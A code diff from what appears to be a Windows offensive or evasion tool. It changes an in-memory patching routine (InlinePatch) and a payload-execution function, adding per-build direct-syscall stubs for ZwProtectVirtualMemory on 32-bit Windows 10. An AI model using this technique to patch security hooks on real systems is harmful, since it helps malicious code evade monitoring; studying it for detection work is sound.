@@ -458,13 +458,11 @@ VOID Execute(LPVOID lpPayload)
 }
 
 INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
-	PNT_TIB pTIB = NULL;
 	PTEB pTEB = NULL;
 	PPEB pPEB = NULL;
 
 	// Get pointer to the TEB
-	pTIB = (PNT_TIB)__readgsqword(0x30);
-	pTEB = (PTEB)pTIB->Self;
+	pTEB = NtCurrentTeb();
 
 	// Get pointer to the PEB
 	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
@@ -473,8 +471,37 @@ INT InlinePatch(LPVOID lpFuncAddress, UCHAR* patch, int patchsize) {
 	}
 
 	if (pPEB->OSMajorVersion == 10 && pPEB->OSMinorVersion == 0) {
-		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
 		ZwWriteVirtualMemory = &ZwWriteVirtualMemory10;
+#ifdef _X64
+		ZwProtectVirtualMemory = &ZwProtectVirtualMemory10;
+#else
+		switch (pPEB->OSBuildNumber) {
+		case 10240: // 1507
+		case 10586: // 1511
+		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_1;
+			break;
+		case 14393: // 1607
+		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_2;
+			break;
+		case 15063: // 1703
+		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_3;
+			break;
+		case 16299: // 1709
+		case 17134: // 1803
+		case 17763: // 1809
+		case 18362: // 1903
+		case 18363: // 1909
+		case 19041: // 2004
+		case 19042: // 20H2
+		case 19043: // 21H1
+		case 19044: // 21H2
+		case 19045: // 22H2
+		    ZwProtectVirtualMemory = &ZwProtectVirtualMemory10_4;
+			break;
+		}
+		
+#endif
+
 	}
 	else if (pPEB->OSMajorVersion == 6 && pPEB->OSMinorVersion == 1 && pPEB->OSBuildNumber == 7601) {
 		ZwProtectVirtualMemory = &ZwProtectVirtualMemory7SP1;
